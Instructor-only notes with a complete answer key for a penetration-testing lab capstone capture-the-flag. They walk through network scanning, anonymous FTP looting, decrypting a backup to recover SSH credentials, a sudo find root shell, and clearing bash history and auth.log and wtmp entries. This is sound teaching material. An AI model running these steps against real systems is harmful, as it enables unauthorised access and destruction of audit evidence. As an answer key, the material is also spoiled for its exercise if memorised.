---
title: "Lab 12 Notes: Full-Chain Capstone CTF"
---

## Overview

This is the capstone episode, porting Lab 12 (Full-Chain Capstone CTF —
all 5 phases, chained) from the companion
[Hacking-Labs-Training](https://github.com/moktan456/Hacking-Labs-Training)
repository into The Carpentries Workbench format. Unlike the earlier
labs, the worksheet gives learners milestones rather than step-by-step
commands — they're expected to draw on every technique from Labs 1–11
with no target list and no given credentials.

## Timing

Full episode: ~115 minutes (15 min teaching + 100 min exercises). This
runs longer than earlier labs by design — it's an unaided, chained
engagement across three services, not a single guided technique.

## CTF walkthrough (spoiler — instructors only)

The episode's "Full Chain Objective" challenge asks learners to find
`user.txt` and `root.txt` somewhere on `10.10.12.0/24`, attacking only
from `lab12-attacker` (10.10.12.2), with no target list given. Full
end-to-end answer key:

### Milestone 1: Recon & Scanning

```bash
nmap -sn 10.10.12.0/24
nmap -sV -p- 10.10.12.10 10.10.12.11 10.10.12.12
```

Finds:
- `10.10.12.10` — HTTP (nginx)
- `10.10.12.11` — FTP (vsftpd)
- `10.10.12.12` — SSH (OpenSSH)

### Milestone 2: Enumeration

```bash
curl -s http://10.10.12.10 | grep -i passphrase
```

Reveals an HTML comment: *"temp passphrase for this quarter's encrypted
backups is `Summer2024!`"*

```bash
ftp 10.10.12.11
# Name: anonymous
cd pub
ls
get employees.txt
get backup.enc
quit
```

`employees.txt` lists usernames including `jdoe`. `backup.enc` is clearly
OpenSSL-encrypted (binary, `.enc` extension).

### Milestone 3: Gaining Access

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in backup.enc -pass pass:Summer2024!
```

Output: `jdoe SSH password: N3wHire2024#`

```bash
ssh jdoe@10.10.12.12
# password: N3wHire2024#
cat user.txt
```

**User flag:** `flag{lab12_ftp_to_ssh_creds_chain}`

### Milestone 4: Privilege Escalation

```bash
sudo -l
```

Shows: `(ALL) NOPASSWD: /usr/bin/find`

[GTFOBins](https://gtfobins.github.io/gtfobins/find/) documents the
standard technique for this exact binary:

```bash
sudo find . -exec /bin/sh \; -quit
whoami
cat /root/root.txt
```

**Root flag:** `flag{lab12_full_chain_root}`

### Milestone 5 (Bonus): Covering Tracks

Same techniques as the covering-tracks lab, applied to `lab12-ssh`:

```bash
unset HISTFILE
history -c
> ~/.bash_history
```

As root (from the shell obtained via `find`):

```bash
sed -i '/10.10.12.2/d' /var/log/auth.log 2>/dev/null
> /var/log/wtmp 2>/dev/null
```

Note: this minimal target image may not have `auth.log`/`wtmp` populated
the way the covering-tracks lab's target did, since it has no `rsyslog`
running. If a learner reports this, that's expected — flag it as a
legitimate finding worth writing up ("the target's logging itself was
insufficient to reconstruct attacker activity"), not a broken exercise.

### Full chain

Web page → passphrase → FTP → encrypted backup → decrypt → SSH
credentials → user flag → sudo misconfiguration → GTFOBins technique →
root shell → root flag. Every step used a tool and technique from an
earlier lab, chained with no hints — exactly what a real
beginner-to-intermediate pentest engagement looks like end to end.

## Common sticking points

- **No target list is intentional.** Learners used to earlier labs
  handing them IPs sometimes ask "what am I supposed to scan?" — that's
  the point of Milestone 1; redirect them to `nmap -sn` on the whole
  `/24` rather than giving out `10.10.12.10`–`.12` directly.
- **The passphrase is in the page source, not the rendered page.**
  Learners who only look at the rendered web page in a browser miss the
  HTML comment; remind them to check View Source or `curl`/`curl -s | grep`.
- **`backup.enc` needs the exact cipher and KDF flags.** `openssl enc -d`
  will fail or produce garbage without both `-aes-256-cbc` and `-pbkdf2`
  matching how it was encrypted — if a learner gets a
  "bad decrypt"/garbled output, have them check both flags before
  assuming the passphrase is wrong.
- **Turning `sudo -l` output into a root shell** is the step most likely
  to stall a learner who hasn't used GTFOBins before — the worksheet
  deliberately points them there rather than giving the `find` payload
  directly; let them search GTFOBins for `find` themselves before
  offering the syntax.
- **Milestone 5 (bonus) can look "broken."** Because this minimal Ubuntu
  target has no `rsyslog`, `/var/log/auth.log` may be empty or missing
  entirely, and `wtmp` may not reflect the SSH login the way a fuller
  system's logs would. This is expected — don't let learners spend a long
  time debugging a log-clearing command that "isn't working" when the
  real lesson is that the log was never populated in the first place.
